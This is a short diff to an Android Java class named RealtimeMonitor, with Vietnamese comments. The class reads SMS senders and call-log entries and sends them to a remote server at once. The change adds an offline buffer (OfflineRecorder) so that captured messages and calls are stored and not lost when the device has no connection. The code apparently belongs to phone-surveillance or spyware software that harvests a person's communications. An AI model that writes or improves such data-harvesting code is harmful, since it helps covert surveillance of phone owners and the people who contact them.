@@ -125,9 +125,13 @@ public class RealtimeMonitor {
                                     smsData.put("timestamp", System.currentTimeMillis());
 
                                     // Gửi lên server NGAY LẬP TỨC
-                                    ConnectionManager.sendRealtimeData(smsData);
-                                    
-                                    Log.d(TAG, "📤 Sent realtime SMS: " + address);
+                                    if (ConnectionManager.isConnected()) {
+                                        ConnectionManager.sendRealtimeData(smsData);
+                                        Log.d(TAG, "📤 Sent realtime SMS: " + address);
+                                    } else {
+                                        OfflineRecorder.saveEvent(context, smsData);
+                                        Log.d(TAG, "📦 Buffered offline SMS: " + address);
+                                    }
                                 }
                             }
                             cursor.close();
@@ -204,9 +208,13 @@ public class RealtimeMonitor {
                                     callData.put("timestamp", System.currentTimeMillis());
 
                                     // Gửi lên server NGAY LẬP TỨC
-                                    ConnectionManager.sendRealtimeData(callData);
-                                    
-                                    Log.d(TAG, "📤 Sent realtime call: " + number + " (" + callType + ")");
+                                    if (ConnectionManager.isConnected()) {
+                                        ConnectionManager.sendRealtimeData(callData);
+                                        Log.d(TAG, "📤 Sent realtime call: " + number + " (" + callType + ")");
+                                    } else {
+                                        OfflineRecorder.saveEvent(context, callData);
+                                        Log.d(TAG, "📦 Buffered offline call: " + number);
+                                    }
                                 }
                             }
                             cursor.close();
